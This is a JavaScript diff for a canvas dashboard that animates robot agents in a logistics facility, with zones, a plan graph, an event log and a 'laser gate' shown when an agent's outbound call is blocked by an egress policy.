+          toolDisplay: '',
+          pulseGlow: 0,
+          thoughtTimer: 0
+        };
+      });
+
+      // Pneumatic Tubes Capsules
+      const capsules = [];
+
+      // Conveyor Packages
+      const conveyorPackages = [
+        { x: 540, offset: 0, id: 'PKG-101' },
+        { x: 620, offset: 0.33, id: 'PKG-102' },
+        { x: 700, offset: 0.66, id: 'PKG-103' }
+      ];
+
+      // Laser Gate Status
+      let laserDoorActive = false;
+      let laserDoorOpacity = 0.2;
+
+      // Plan DAG connections
+      let activePlanLines = [];
+
+      // Render Loop (60 FPS)
+      let lastTime = performance.now();
+
+      function renderFacility(timestamp) {
+        const dt = Math.min(50, timestamp - lastTime) / 1000;
+        lastTime = timestamp;
+
+        ctx.clearRect(0, 0, cw, ch);
+
+        // Coordinate scaling to ensure 1000x560 virtual design fits beautifully
+        const scale = Math.min(cw / 980, ch / 550);
+        ctx.save();
+        ctx.translate((cw - 980 * scale) / 2, (ch - 550 * scale) / 2);
+        ctx.scale(scale, scale);
+
+        // 1. Draw Architectural Floor & Zones
+        drawFloorAndZones(ctx);
+
+        // 2. Draw Conveyor Belt & Moving Packages
+        drawConveyor(ctx, dt);
+
+        // 3. Draw Pneumatic Tube Pipes
+        drawPneumaticPipes(ctx);
+
+        // 4. Draw Plan DAG Links (if active incident)
+        drawPlanDAG(ctx);
+
+        // 5. Update & Draw Robot Agents (Depth-sorted Y)
+        const sortedRobots = [...robots].sort((a, b) => a.currY - b.currY);
+        for (const r of sortedRobots) {
+          updateRobot(r, dt);
+          drawHumanoidRobot(ctx, r);
         }
 
-        animationFrameId = requestAnimationFrame(animateStats);
+        // 6. Draw Pneumatic Capsules shooting along ceiling
+        updateAndDrawCapsules(ctx, dt);
+
+        // 7. Draw Security Laser Quarantine Field
+        drawLaserGate(ctx, dt);
+
+        ctx.restore();
+        requestAnimationFrame(renderFacility);
       }
-      animationFrameId = requestAnimationFrame(animateStats);
+      requestAnimationFrame(renderFacility);
 
-      // ==========================================
-      // SVG PARTICLE & BEAM PULSE ENGINE (60 FPS)
-      // ==========================================
-      const activePulses = [];
+      // Floor Layout & Zone Desks
+      function drawFloorAndZones(c) {
+        // Main base slab
+        c.fillStyle = '#080f1e';
+        c.fillRect(20, 20, 940, 510);
+        c.strokeStyle = 'rgba(0, 240, 255, 0.12)';
+        c.lineWidth = 1.5;
+        c.strokeRect(20, 20, 940, 510);
 
-      function spawnPulse(pathId, color, glowColor, speed = 1.0, onComplete = null) {
-        const pathElem = document.getElementById(pathId);
-        if (!pathElem) return;
+        // Subtle tile grid lines
+        c.strokeStyle = 'rgba(255, 255, 255, 0.025)';
+        c.lineWidth = 1;
+        for (let x = 60; x < 940; x += 40) {
+          c.beginPath(); c.moveTo(x, 20); c.lineTo(x, 530); c.stroke();
+        }
+        for (let y = 60; y < 530; y += 40) {
+          c.beginPath(); c.moveTo(20, y); c.lineTo(960, y); c.stroke();
+        }
 
-        const pathLength = pathElem.getTotalLength();
-        if (!pathLength) return;
+        // Zone 1: Receiving Dock (Top-Left)
+        drawZoneBox(c, 30, 30, 210, 160, 'RECEIVING DOCK', 'Triage & Ingest', '#00f0ff');
+        drawDesk(c, 110, 140, 60, 24, '#00f0ff');
 
-        // Particle element
-        const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
-        circle.setAttribute('r', '5');
-        circle.setAttribute('fill', color);
-        circle.setAttribute('filter', glowColor);
-        circle.setAttribute('class', 'pulse-particle');
+        // Zone 2: Warehouse Floor (Top-Center-Left)
+        drawZoneBox(c, 260, 30, 250, 160, 'WAREHOUSE & PROCUREMENT', 'Pallet Racks & Tenders', '#ff9900');
+        drawRacks(c, 280, 55, 100, 30);
+        drawDesk(c, 340, 140, 70, 24, '#ff9900');
 
-        // Spark trail
-        const trail = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
-        trail.setAttribute('r', '8');
-        trail.setAttribute('fill', color);
-        trail.setAttribute('opacity', '0.35');
-        trail.setAttribute('class', 'pulse-particle');
+        // Zone 3: Dispatch Yard (Top-Center-Right)
+        drawZoneBox(c, 530, 30, 220, 160, 'DISPATCH YARD', 'Fleet Gates & IoT', '#ff9900');
+        drawTruckSilhouette(c, 680, 65);
+        drawDesk(c, 610, 140, 60, 24, '#ff9900');
 
-        els.pulsesLayer.appendChild(trail);
-        els.pulsesLayer.appendChild(circle);
+        // Zone 4: Customs & Hazmat (Top-Right)
+        drawZoneBox(c, 770, 30, 180, 160, 'CUSTOMS & HAZMAT', 'Declarations & Cross-Border', '#ff9900');
+        drawDesk(c, 830, 140, 60, 24, '#ff9900');
 
-        activePulses.push({
-          circle,
-          trail,
-          pathElem,
-          pathLength,
+        // Zone 5: Support Call Center (Mid-Left)
+        drawZoneBox(c, 30, 210, 210, 150, 'SUPPORT CALL CENTER', 'Customer Operations', '#ff9900');
+        drawDesk(c, 110, 290, 60, 24, '#ff9900');
+
+        // Zone 6: Control Tower (Center Hub)
+        drawHexagonControlTower(c, 480, 280, 95);
+
+        // Zone 7: Security Gate & Quarantine (Mid-Right)
+        drawZoneBox(c, 770, 210, 180, 150, 'SECURITY GATE', 'Egress Sandbox Allowlist', '#b55fe6');
+        drawDesk(c, 850, 290, 60, 24, '#b55fe6');
+
+        // Zone 8: Finance Wing (Bottom-Left)
+        drawZoneBox(c, 30, 380, 190, 140, 'FINANCE WING', 'Claims & Ledger Audit', '#ff9900');
+        drawDesk(c, 110, 440, 60, 24, '#ff9900');
+
+        // Zone 9: Maintenance Bay (Bottom-Center-Left)
+        drawZoneBox(c, 240, 380, 200, 140, 'MAINTENANCE BAY', 'Tractor Telematics & Servicing', '#ff9900');
+        drawDesk(c, 290, 440, 60, 24, '#ff9900');
+
+        // Zone 10: Records Vault (Bottom-Center-Right)
+        drawZoneBox(c, 460, 380, 200, 140, 'RECORDS VAULT', 'Memory & Postmortems', '#ffcc00');
+        drawDesk(c, 520, 440, 60, 24, '#ffcc00');
+
+        // Zone 11: Cryptographic Audit Wall (Bottom-Right)
+        drawZoneBox(c, 680, 380, 270, 140, 'AUDIT WALL', 'SHA-256 Hash Chain Wall', '#b55fe6');
+        drawAuditWallLinks(c, 710, 420);
+      }
+
+      function drawZoneBox(c, x, y, w, h, title, sub, color) {
+        c.fillStyle = 'rgba(12, 22, 42, 0.55)';
+        c.fillRect(x, y, w, h);
+        c.strokeStyle = 'rgba(255, 255, 255, 0.08)';
+        c.lineWidth = 1;
+        c.strokeRect(x, y, w, h);
+
+        // Accent corner
+        c.fillStyle = color;
+        c.fillRect(x, y, 16, 2);
+        c.fillRect(x, y, 2, 16);
+
+        c.font = '700 9.5px ui-monospace, monospace';
+        c.fillStyle = '#ffffff';
+        c.fillText(title, x + 8, y + 16);
+        c.font = '8px ui-monospace, monospace';
+        c.fillStyle = 'rgba(200, 215, 235, 0.5)';
+        c.fillText(sub, x + 8, y + 27);
+      }
+
+      function drawDesk(c, x, y, w, h, color) {
+        // Desk shadow
+        c.fillStyle = 'rgba(0, 0, 0, 0.4)';
+        c.fillRect(x - w / 2 + 2, y - h / 2 + 4, w, h);
+
+        // Desk top
+        c.fillStyle = '#0f1c30';
+        c.fillRect(x - w / 2, y - h / 2, w, h);
+        c.strokeStyle = 'rgba(255, 255, 255, 0.12)';
+        c.lineWidth = 1;
+        c.strokeRect(x - w / 2, y - h / 2, w, h);
+
+        // Glowing monitor screen
+        c.fillStyle = color;
+        c.fillRect(x - 8, y - h / 2 + 3, 16, 4);
+      }
+
+      function drawRacks(c, x, y, w, h) {
+        c.fillStyle = 'rgba(255, 153, 0, 0.08)';
+        c.fillRect(x, y, w, h);
+        c.strokeStyle = 'rgba(255, 153, 0, 0.2)';
+        c.strokeRect(x, y, w, h);
+        c.fillStyle = 'rgba(255, 255, 255, 0.15)';
+        for (let i = x + 8; i < x + w - 8; i += 18) {
+          c.fillRect(i, y + 6, 12, 18);
+        }
+      }
+
+      function drawTruckSilhouette(c, x, y) {
+        c.fillStyle = 'rgba(0, 240, 255, 0.1)';
+        c.fillRect(x, y, 42, 20);
+        c.fillRect(x + 36, y + 5, 14, 15);
+      }
+
+      function drawHexagonControlTower(c, cx, cy, radius) {
+        c.save();
+        c.beginPath();
+        for (let i = 0; i < 6; i++) {
+          const angle = (Math.PI / 3) * i;
+          const x = cx + radius * Math.cos(angle);
+          const y = cy + radius * Math.sin(angle);
+          if (i === 0) c.moveTo(x, y);
+          else c.lineTo(x, y);
+        }
+        c.closePath();
+        c.fillStyle = 'rgba(15, 28, 55, 0.7)';
+        c.fill();
+        c.strokeStyle = 'rgba(255, 204, 0, 0.35)';
+        c.lineWidth = 1.5;
+        c.stroke();
+
+        // Inner glowing ring
+        c.beginPath();
+        c.arc(cx, cy, 32, 0, Math.PI * 2);
+        c.strokeStyle = 'rgba(255, 204, 0, 0.6)';
+        c.stroke();
+
+        c.font = '700 9px ui-monospace, monospace';
+        c.fillStyle = '#ffcc00';
+        c.textAlign = 'center';
+        c.fillText('CONTROL TOWER', cx, cy - 40);
+        c.font = '8px ui-monospace, monospace';
+        c.fillStyle = '#c9d5e3';
+        c.fillText('Orchestrator Hub', cx, cy + 46);
+        c.restore();
+      }
+
+      function drawAuditWallLinks(c, x, y) {
+        c.fillStyle = 'rgba(181, 95, 230, 0.15)';
+        c.fillRect(x, y, 190, 36);
+        c.strokeStyle = 'rgba(181, 95, 230, 0.4)';
+        c.strokeRect(x, y, 190, 36);
+
+        c.font = '8px ui-monospace, monospace';
+        c.fillStyle = '#b55fe6';
+        c.fillText(`BLOCK #${state.auditSeq} [SHA256: 4f8a...c02b]`, x + 8, y + 16);
+        c.fillStyle = '#00ff88';
+        c.fillText('HASH CHAIN INTEGRITY: 100% VALID', x + 8, y + 28);
+      }
+
+      // Conveyor Belt
+      function drawConveyor(c, dt) {
+        const y = 265;
+        c.fillStyle = '#0a1426';
+        c.fillRect(520, y, 220, 20);
+        c.strokeStyle = 'rgba(0, 240, 255, 0.2)';
+        c.strokeRect(520, y, 220, 20);
+
+        // Rollers
+        c.fillStyle = 'rgba(255, 255, 255, 0.1)';
+        for (let x = 525; x < 735; x += 16) {
+          c.fillRect(x, y + 2, 6, 16);
+        }
+
+        // Packages moving rightward
+        for (const pkg of conveyorPackages) {
+          pkg.x += dt * 38;
+          if (pkg.x > 730) pkg.x = 525;
+
+          c.fillStyle = '#ff9900';
+          c.fillRect(pkg.x, y + 3, 16, 14);
+          c.strokeStyle = '#ffffff';
+          c.lineWidth = 0.8;
+          c.strokeRect(pkg.x, y + 3, 16, 14);
+        }
+      }
+
+      // Pneumatic Tubes System
+      function drawPneumaticPipes(c) {
+        c.save();
+        c.strokeStyle = 'rgba(0, 240, 255, 0.18)';
+        c.lineWidth = 4;
+        c.beginPath();
+        // Pipe 1: Receiving Dock to Control Tower
+        c.moveTo(130, 110);
+        c.lineTo(320, 110);
+        c.lineTo(440, 240);
+        // Pipe 2: Control Tower to Support
+        c.moveTo(440, 280);
+        c.lineTo(240, 280);
+        // Pipe 3: Control Tower to Security Gate
+        c.moveTo(560, 280);
+        c.lineTo(770, 280);
+        c.stroke();
+        c.restore();
+      }
+
+      function updateAndDrawCapsules(c, dt) {
+        for (let i = capsules.length - 1; i >= 0; i--) {
+          const cap = capsules[i];
+          cap.progress += dt * cap.speed;
+          if (cap.progress >= 1.0) {
+            capsules.splice(i, 1);
+          } else {
+            const x = cap.startX + (cap.endX - cap.startX) * cap.progress;
+            const y = cap.startY + (cap.endY - cap.startY) * cap.progress;
+            c.save();
+            c.fillStyle = cap.color;
+            c.shadowColor = cap.color;
+            c.shadowBlur = 10;
+            c.beginPath();
+            c.arc(x, y, 5, 0, Math.PI * 2);
+            c.fill();
+            c.restore();
+          }
+        }
+      }
+
+      function shootPneumaticCapsule(startX, startY, endX, endY, color = '#00f0ff') {
+        capsules.push({
+          startX, startY, endX, endY,
           progress: 0,
-          speed: speed * (1400 / Math.max(300, pathLength)), // proportional speed
-          onComplete
+          speed: 1.8,
+          color
         });
       }
 
-      function updatePulses() {
-        for (let i = activePulses.length - 1; i >= 0; i--) {
-          const p = activePulses[i];
-          p.progress += 0.024 * p.speed;
+      // Security Laser Door
+      function drawLaserGate(c, dt) {
+        const x = 760;
+        const yTop = 210;
+        const yBottom = 360;
 
-          if (p.progress >= 1.0) {
-            if (p.circle.parentNode) p.circle.parentNode.removeChild(p.circle);
-            if (p.trail.parentNode) p.trail.parentNode.removeChild(p.trail);
-            if (p.onComplete) p.onComplete();
-            activePulses.splice(i, 1);
-          } else {
-            const pt = p.pathElem.getPointAtLength(p.progress * p.pathLength);
-            p.circle.setAttribute('cx', pt.x);
-            p.circle.setAttribute('cy', pt.y);
+        // Gate Posts
+        c.fillStyle = '#1e0c1b';
+        c.fillRect(x - 5, yTop, 10, 20);
+        c.fillRect(x - 5, yBottom - 20, 10, 20);
 
-            const trailDist = Math.max(0, (p.progress - 0.05) * p.pathLength);
-            const ptTrail = p.pathElem.getPointAtLength(trailDist);
-            p.trail.setAttribute('cx', ptTrail.x);
-            p.trail.setAttribute('cy', ptTrail.y);
+        // Laser beam / forcefield
+        c.save();
+        if (laserDoorActive) {
+          laserDoorOpacity = Math.min(0.9, laserDoorOpacity + dt * 3);
+          c.shadowColor = '#ff2a55';
+          c.shadowBlur = 18;
+          c.strokeStyle = `rgba(255, 42, 85, ${laserDoorOpacity})`;
+          c.lineWidth = 4;
+          c.beginPath();
+          c.moveTo(x, yTop + 10);
+          c.lineTo(x, yBottom - 10);
+          c.stroke();
+
+          // Forcefield grid
+          c.fillStyle = `rgba(255, 42, 85, ${laserDoorOpacity * 0.25})`;
+          c.fillRect(x - 12, yTop + 10, 24, yBottom - yTop - 20);
+        } else {
+          laserDoorOpacity = Math.max(0.1, laserDoorOpacity - dt * 2);
+          c.strokeStyle = `rgba(0, 255, 136, ${laserDoorOpacity})`;
+          c.lineWidth = 1.5;
+          c.beginPath();
+          c.moveTo(x, yTop + 10);
+          c.lineTo(x, yBottom - 10);
+          c.stroke();
+        }
+        c.restore();
+      }
+
+      // Incident Plan DAG Links
+      function drawPlanDAG(c) {
+        if (!state.activePlan || !state.activePlan.steps) return;
+        c.save();
+        c.strokeStyle = 'rgba(255, 204, 0, 0.45)';
+        c.lineWidth = 2;
+        c.setLineDash([5, 4]);
+
+        const orch = robots.find(r => r.id === 'orchestrator');
+        if (!orch) return;
+
+        for (const step of state.activePlan.steps) {
+          const target = robots.find(r => r.id === step.agent);
+          if (target) {
+            c.beginPath();
+            c.moveTo(orch.currX, orch.currY - 15);
+            c.lineTo(target.currX, target.currY - 15);
+            c.stroke();
+
+            // Status node dot
+            c.fillStyle = step.status === 'done' ? '#00ff88' : (step.status === 'running' ? '#00f0ff' : '#ffcc00');
+            c.beginPath();
+            const midX = (orch.currX + target.currX) / 2;
+            const midY = (orch.currY + target.currY) / 2 - 15;
+            c.arc(midX, midY, 4, 0, Math.PI * 2);
+            c.fill();
           }
         }
-        requestAnimationFrame(updatePulses);
-      }
-      requestAnimationFrame(updatePulses);
-
-      // ==========================================
-      // NODE HIGHLIGHT & INTERACTION
-      // ==========================================
-      function flashNode(nodeKey, highlightClass, duration = 1200) {
-        const node = els.nodes[nodeKey];
-        if (!node) return;
-        node.classList.add(highlightClass);
-        setTimeout(() => {
-          node.classList.remove(highlightClass);
-        }, duration);
+        c.restore();
       }
 
-      function updateAgentStatus(agent, text) {
-        if (agent === 'support' && els.supportStatusLine) {
-          els.supportStatusLine.textContent = text;
-        } else if (agent === 'procurement' && els.procurementStatusLine) {
-          els.procurementStatusLine.textContent = text;
-        } else if (agent === 'dispatch' && els.dispatchStatusLine) {
-          els.dispatchStatusLine.textContent = text;
+      // Update Individual Robot Movement & Animation
+      function updateRobot(r, dt) {
+        const dx = r.targetX - r.currX;
+        const dy = r.targetY - r.currY;
+        const dist = Math.sqrt(dx * dx + dy * dy);
+
+        if (dist > 3) {
+          r.isWalking = true;
+          const speed = 70;
+          r.vx = (dx / dist) * speed;
+          r.vy = (dy / dist) * speed;
+          r.currX += r.vx * dt;
+          r.currY += r.vy * dt;
+          r.facing = dx > 0 ? 1 : -1;
+          r.walkPhase += dt * 9;
+        } else {
+          r.isWalking = false;
+          r.currX = r.targetX;
+          r.currY = r.targetY;
+          r.walkPhase += dt * 2; // subtle idle breathing
+        }
+
+        if (r.pulseGlow > 0) {
+          r.pulseGlow = Math.max(0, r.pulseGlow - dt * 1.5);
+        }
+        if (r.thoughtTimer > 0) {
+          r.thoughtTimer -= dt;
+          if (r.thoughtTimer <= 0) r.toolDisplay = '';
+        }
+      }
+
+      // Draw Procedural Humanoid Biped Robot (48px tall)
+      function drawHumanoidRobot(c, r) {
+        const x = r.currX;
+        const y = r.currY;
+        const facing = r.facing;
+        const tierColor = r.color;
+
+        c.save();
+        c.translate(x, y);
+
+        // 1. Dynamic Floor Shadow
+        c.fillStyle = 'rgba(0, 0, 0, 0.45)';
+        c.beginPath();
+        c.ellipse(0, 4, 14, 5, 0, 0, Math.PI * 2);
+        c.fill();
+
+        // 2. Pulse Glow Halo (if active tool execution)
+        if (r.pulseGlow > 0) {
+          c.shadowColor = tierColor;
+          c.shadowBlur = 15 * r.pulseGlow;
+        }
+
+        // Animated walk offsets
+        const bob = r.isWalking ? Math.sin(r.walkPhase * 2) * 2.5 : Math.sin(r.walkPhase) * 1;
+        const legSwing1 = r.isWalking ? Math.sin(r.walkPhase) * 10 : 0;
+        const legSwing2 = r.isWalking ? Math.sin(r.walkPhase + Math.PI) * 10 : 0;
+        const armSwing1 = r.isWalking ? Math.sin(r.walkPhase + Math.PI) * 8 : 0;
+        const armSwing2 = r.isWalking ? Math.sin(r.walkPhase) * 8 : 0;
+
+        // 3. Legs & Feet
+        c.strokeStyle = '#2d3b50';
+        c.lineWidth = 3.5;
+        c.lineCap = 'round';
+
+        // Left Leg
+        c.beginPath();
+        c.moveTo(-4, -12 + bob);
+        c.lineTo(-4 + legSwing1 * 0.4, -2);
+        c.lineTo(-4 + legSwing1, 4);
+        c.stroke();
+
+        // Right Leg
+        c.beginPath();
+        c.moveTo(4, -12 + bob);
+        c.lineTo(4 + legSwing2 * 0.4, -2);
+        c.lineTo(4 + legSwing2, 4);
+        c.stroke();
+
+        // Feet (Metal Boots)
+        c.fillStyle = '#1a2332';
+        c.fillRect(-6 + legSwing1, 2, 5, 3);
+        c.fillRect(2 + legSwing2, 2, 5, 3);
+
+        // 4. Torso with Chest Display
+        c.fillStyle = '#162238';
+        c.strokeStyle = tierColor;
+        c.lineWidth = 1.2;
+        c.beginPath();
+        c.roundRect(-8, -28 + bob, 16, 17, 3);
+        c.fill();
+        c.stroke();
+
+        // Chest display emblem
+        c.fillStyle = tierColor;
+        c.fillRect(-4, -24 + bob, 8, 5);
+
+        // 5. Arms & Hands
+        c.strokeStyle = '#2d3b50';
+        c.lineWidth = 3;
+
+        // Left Arm
+        c.beginPath();
+        c.moveTo(-8, -26 + bob);
+        c.lineTo(-12 + armSwing1, -16 + bob);
+        c.stroke();
+
+        // Right Arm (Forward)
+        c.beginPath();
+        c.moveTo(8, -26 + bob);
+        c.lineTo(12 + armSwing2, -16 + bob);
+        c.stroke();
+
+        // 6. Head & Cyber Visor
+        c.fillStyle = '#0f1828';
+        c.strokeStyle = tierColor;
+        c.lineWidth = 1.2;
+        c.beginPath();
+        c.roundRect(-6, -42 + bob, 12, 12, 3);
+        c.fill();
+        c.stroke();
+
+        // Glowing Visor Eyes
+        c.fillStyle = r.state === 'blocked' ? '#ff2a55' : tierColor;
+        c.fillRect(facing === 1 ? -1 : -5, -38 + bob, 6, 3);
+
+        // 7. Unique Accessories
+        drawRobotAccessory(c, r, bob);
+
+        // 8. Thought / Active Tool Speech Bubble
+        if (r.toolDisplay) {
+          c.fillStyle = 'rgba(7, 14, 28, 0.9)';
+          c.strokeStyle = tierColor;
+          c.lineWidth = 1;
+          c.beginPath();
+          c.roundRect(-45, -64 + bob, 90, 16, 3);
+          c.fill();
+          c.stroke();
+
+          c.font = '700 8.5px ui-monospace, monospace';
+          c.fillStyle = '#ffffff';
+          c.textAlign = 'center';
+          c.fillText(r.toolDisplay, 0, -53 + bob);
+        }
+
+        // 9. Floating Name Tag
+        c.font = '700 8px ui-monospace, monospace';
+        c.fillStyle = '#c9d5e3';
+        c.textAlign = 'center';
+        c.fillText(r.name.toUpperCase(), 0, 15);
+
+        c.restore();
+      }
+
+      function drawRobotAccessory(c, r, bob) {
+        if (r.accessory === 'headset') {
+          c.strokeStyle = '#ffcc00';
+          c.lineWidth = 1.5;
+          c.beginPath(); c.arc(0, -42 + bob, 7, Math.PI, 0); c.stroke();
+          c.fillRect(4, -38 + bob, 3, 4);
+        } else if (r.accessory === 'hardhat') {
+          c.fillStyle = '#ff9900';
+          c.fillRect(-7, -46 + bob, 14, 5);
+        } else if (r.accessory === 'crown') {
+          c.fillStyle = '#ffcc00';
+          c.beginPath();
+          c.moveTo(-6, -44 + bob);
+          c.lineTo(-3, -48 + bob);
+          c.lineTo(0, -44 + bob);
+          c.lineTo(3, -48 + bob);
+          c.lineTo(6, -44 + bob);
+          c.stroke();
+        } else if (r.accessory === 'antenna') {
+          c.strokeStyle = '#00f0ff';
+          c.lineWidth = 1.5;
+          c.beginPath(); c.moveTo(0, -42 + bob); c.lineTo(0, -50 + bob); c.stroke();
+          c.fillStyle = '#00f0ff';
+          c.beginPath(); c.arc(0, -51 + bob, 2, 0, Math.PI * 2); c.fill();
         }
       }
 
       // ==========================================
-      // DRAMATIC BLOCKED VIOLATION SEQUENCE
+      // ROBOT CLICK / INSPECTOR MODAL
       // ==========================================
-      function triggerBlockedSequence(agent, host, detail) {
-        // 1. Audio Alarm
-        AudioEngine.playAlarm();
+      canvas.addEventListener('click', (e) => {
+        const rect = canvas.getBoundingClientRect();
+        const scale = Math.min(cw / 980, ch / 550);
+        const offsetX = (cw - 980 * scale) / 2;
+        const offsetY = (ch - 550 * scale) / 2;
+        const clickX = (e.clientX - rect.left - offsetX) / scale;
+        const clickY = (e.clientY - rect.top - offsetY) / scale;
 
-        // 2. Shake entire graph
-        els.graphPanel.classList.remove('shake-graph');
-        // Force reflow
-        void els.graphPanel.offsetWidth;
-        els.graphPanel.classList.add('shake-graph');
-        setTimeout(() => {
-          els.graphPanel.classList.remove('shake-graph');
-        }, 500);
-
-        // 3. Highlight Sandbox Node in intense red
-        els.nodes.sandbox.classList.add('highlight-blocked');
-        els.sandboxPolicyStatus.textContent = 'VIOLATION DETECTED';
-        els.sandboxPolicyStatus.setAttribute('fill', '#ff2a55');
-
-        setTimeout(() => {
-          els.nodes.sandbox.classList.remove('highlight-blocked');
-          els.sandboxPolicyStatus.textContent = 'ENFORCING';
-          els.sandboxPolicyStatus.setAttribute('fill', '#00ff88');
-        }, 3200);
-
-        // 4. Show Dramatic Banner for exactly 3 seconds with countdown
-        if (state.bannerTimer) clearTimeout(state.bannerTimer);
-        if (state.bannerProgressTimer) clearInterval(state.bannerProgressTimer);
-
-        els.bannerDetail.textContent = detail || 'Unauthorized outbound call was quarantined by policy rule.';
-        els.bannerHost.textContent = `TARGET HOST: ${host || 'untrusted-external-domain'}`;
-        els.banner.classList.add('visible');
-        els.bannerProgress.style.transform = 'scaleX(1)';
-
-        const bannerDuration = 3000;
-        const startTime = Date.now();
-
-        state.bannerProgressTimer = setInterval(() => {
-          const elapsed = Date.now() - startTime;
-          const remaining = Math.max(0, 1 - (elapsed / bannerDuration));
-          els.bannerProgress.style.transform = `scaleX(${remaining})`;
-          if (remaining <= 0) {
-            clearInterval(state.bannerProgressTimer);
+        // Check if any robot was clicked
+        for (const r of robots) {
+          const dist = Math.hypot(clickX - r.currX, clickY - r.currY);
+          if (dist < 28) {
+            openInspector(r);
+            return;
           }
-        }, 20);
+        }
+      });
 
-        state.bannerTimer = setTimeout(() => {
-          els.banner.classList.remove('visible');
-        }, bannerDuration);
+      function openInspector(r) {
+        els.insAgentName.textContent = r.name;
+        els.insTierZone.textContent = `${r.tier.toUpperCase()} · Zone: ${r.homeZone.toUpperCase()}`;
+        els.insModelTier.textContent = r.model === 'fast' ? '8B / fast' : (r.model === 'main' ? 'Qwen3.8-27B (main)' : 'Reasoning / deep');
+        els.insCurrentTool.textContent = r.toolDisplay || 'Standby · Awaiting instructions';
+        els.insPolicyHosts.textContent = r.policy.hosts.join(', ');
+
+        els.insToolsChips.innerHTML = '';
+        for (const t of r.tools) {
+          const chip = document.createElement('span');
+          chip.className = 'tool-chip';
+          chip.textContent = `${t}()`;
+          els.insToolsChips.appendChild(chip);
+        }
+
+        els.inspectorDrawer.classList.add('visible');
       }
+
+      els.insCloseBtn.addEventListener('click', () => {
+        els.inspectorDrawer.classList.remove('visible');
+      });
 
       // ==========================================
       // LIVE EVENT LOG
@@ -1813,38 +2274,30 @@
           extra: msg
         };
 
-        // Prepend to in-memory logs (newest first, max 120)
         state.logs.unshift(item);
-        if (state.logs.length > 120) {
-          state.logs.pop();
-        }
+        if (state.logs.length > 120) state.logs.pop();
 
         els.logCountBadge.textContent = `${state.logs.length} / 120`;
-
         renderSingleLogItem(item, true);
       }
 
       function formatLogTime(t) {
         const d = new Date(t);
         const pad = (n) => String(n).padStart(2, '0');
-        const ms = String(d.getMilliseconds()).padStart(3, '0');
-        return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}.${ms}`;
+        return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}.${String(d.getMilliseconds()).padStart(3, '0')}`;
       }
 
       function renderSingleLogItem(item, prepend = true) {
-        // Check filter
-        if (state.activeFilter !== 'all' && item.type !== state.activeFilter) {
-          return;
-        }
+        if (state.activeFilter !== 'all' && item.type !== state.activeFilter) return;
 
         const div = document.createElement('div');
         div.className = `log-item type-${item.type}`;
-        div.setAttribute('data-type', item.type);
 
         let typeBadgeClass = 'badge-event';
-        let typeBadgeLabel = item.type.toUpperCase();
         if (item.type === 'action') typeBadgeClass = 'badge-action';
-        else if (item.type === 'handoff') typeBadgeLabel = 'HANDOFF';
+        else if (item.type === 'handoff') typeBadgeClass = 'badge-handoff';
+        else if (item.type === 'plan') typeBadgeClass = 'badge-plan';
+        else if (item.type === 'audit') typeBadgeClass = 'badge-audit';
         else if (item.type === 'blocked') typeBadgeClass = 'badge-blocked';
         else if (item.type === 'error') typeBadgeClass = 'badge-error';
 
@@ -1853,8 +2306,8 @@
           extraLine = `<div class="log-extra-line"><span>Tool:</span> <span class="highlight">${item.extra.tool}()</span></div>`;
         } else if (item.type === 'blocked' && item.extra.host) {
           extraLine = `<div class="log-extra-line"><span style="color:#ff4466;">Egress Host:</span> <span class="highlight" style="color:#ffb700;">${item.extra.host}</span></div>`;
-        } else if (item.type === 'event' && item.extra.kind) {
-          extraLine = `<div class="log-extra-line"><span>Kind:</span> <span class="highlight">${item.extra.kind}</span></div>`;
+        } else if (item.type === 'audit' && item.extra.hash) {
+          extraLine = `<div class="log-extra-line"><span style="color:#b55fe6;">Chain Hash:</span> <span class="highlight">${item.extra.hash.substring(0, 14)}...</span></div>`;
         }
 
         div.innerHTML = `
@@ -1862,7 +2315,7 @@
             <span class="log-time">${formatLogTime(item.t)}</span>
             <div class="log-tags">
               <span class="agent-pill">${item.agent}</span>
-              <span class="log-badge ${typeBadgeClass}">${typeBadgeLabel}</span>
+              <span class="log-badge ${typeBadgeClass}">${item.type.toUpperCase()}</span>
             </div>
           </div>
           <div class="log-detail-line">${escapeHtml(item.detail)}</div>
@@ -1874,8 +2327,6 @@
         } else {
           els.logList.appendChild(div);
         }
-
-        // Limit DOM items to 120
         while (els.logList.children.length > 120) {
           els.logList.removeChild(els.logList.lastChild);
         }
@@ -1886,23 +2337,14 @@
         const filtered = state.activeFilter === 'all'
           ? state.logs
           : state.logs.filter(l => l.type === state.activeFilter);
-
-        for (const item of filtered) {
-          renderSingleLogItem(item, false);
-        }
+        for (const item of filtered) renderSingleLogItem(item, false);
       }
 
       function escapeHtml(str) {
         if (!str) return '';
-        return String(str)
-          .replace(/&/g, '&amp;')
-          .replace(/</g, '&lt;')
-          .replace(/>/g, '&gt;')
-          .replace(/"/g, '&quot;')
-          .replace(/'/g, '&#39;');
+        return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
       }
 
-      // Filter tabs event listeners
       els.filterTabs.forEach(tab => {
         tab.addEventListener('click', () => {
           els.filterTabs.forEach(t => t.classList.remove('active'));
@@ -1913,146 +2355,227 @@
       });
 
       // ==========================================
-      // TELEMETRY & SYSTEM UPDATES
+      // DRAMATIC BLOCKED VIOLATION SEQUENCE
       // ==========================================
-      function updateTelemetry(telem) {
-        if (telem.ms !== undefined) {
-          state.telemetry.ms = telem.ms;
-          els.telemLatency.textContent = telem.ms;
-          els.telemLatency.className = telem.ms > 300 ? 'accent-amber' : 'accent-cyan';
+      function triggerBlockedSequence(agentId, host, detail) {
+        AudioEngine.playAlarm();
+
+        // Laser Gate activates
+        laserDoorActive = true;
+        setTimeout(() => { laserDoorActive = false; }, 3400);
+
+        // Shake viewport
+        els.viewportPanel.classList.remove('shake-viewport');
+        void els.viewportPanel.offsetWidth;
+        els.viewportPanel.classList.add('shake-viewport');
+        setTimeout(() => els.viewportPanel.classList.remove('shake-viewport'), 500);
+
+        // Offending robot reacts
+        const r = robots.find(bot => bot.id === agentId);
+        if (r) {
+          r.state = 'blocked';
+          r.pulseGlow = 1.0;
+          r.toolDisplay = 'QUARANTINED!';
+          r.thoughtTimer = 3.5;
+
+          // Sentinel walks toward laser gate
+          const sent = robots.find(bot => bot.id === 'sentinel');
+          if (sent) {
+            sent.targetX = 770;
+            sent.targetY = 280;
+            sent.toolDisplay = 'ENGAGING FORCEFIELD';
